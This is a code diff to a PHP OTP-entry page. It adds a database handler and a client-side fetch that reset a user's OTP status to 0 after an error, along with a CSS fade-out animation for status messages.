@@ -75,6 +75,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
         exit;
     }
     
+    // Handle reset OTP to 0
+    if (isset($_POST['reset_otp'])) {
+        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+        
+        if (!$conn) {
+            echo json_encode(['success' => false, 'error' => 'DB connection failed']);
+            exit;
+        }
+        
+        $updateSQL = "UPDATE users SET otp = 0 WHERE phone = $1";
+        $result = pg_query_params($conn, $updateSQL, [$phone]);
+        
+        if ($result) {
+            echo json_encode(['success' => true]);
+        } else {
+            echo json_encode(['success' => false]);
+        }
+        exit;
+    }
+    
     // Handle OTP submission
     if (isset($_POST['submit_otp'])) {
         $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
@@ -285,6 +305,15 @@ button:disabled {
     text-decoration: none;
 }
 
+.fade-out {
+    animation: fadeOut 0.5s forwards;
+}
+
+@keyframes fadeOut {
+    from { opacity: 1; }
+    to { opacity: 0; visibility: hidden; }
+}
+
 @media (max-width: 480px) {
     .container {
         padding: 20px 16px 28px;
@@ -349,13 +378,37 @@ function showMessage(message, type, autoHide = false) {
     
     if (autoHide) {
         setTimeout(() => {
-            statusDiv.classList.remove('show');
+            if (statusDiv) {
+                statusDiv.classList.add('fade-out');
+                setTimeout(() => {
+                    statusDiv.classList.remove('show', 'fade-out');
+                }, 500);
+            }
         }, 3000);
     }
 }
 
 function hideMessage() {
     statusDiv.classList.remove('show');
+}
+
+// Function to reset OTP to 0 in database
+function resetOtpInDatabase() {
+    fetch(window.location.href, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest'
+        },
+        body: 'reset_otp=1'
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('OTP reset to 0');
+        }
+    })
+    .catch(error => console.error('Error resetting OTP:', error));
 }
 
 // Function to check OTP status from database
@@ -398,6 +451,11 @@ function checkOTPStatus() {
                 submitBtn.textContent = 'Submit OTP';
                 isSubmitting = false;
                 inputs[0].focus();
+                
+                // Reset OTP in database after error message fades
+                setTimeout(() => {
+                    resetOtpInDatabase();
+                }, 3500);
                 
             } else if (otpValue === 2) {
                 // OTP is verified - now check logout status
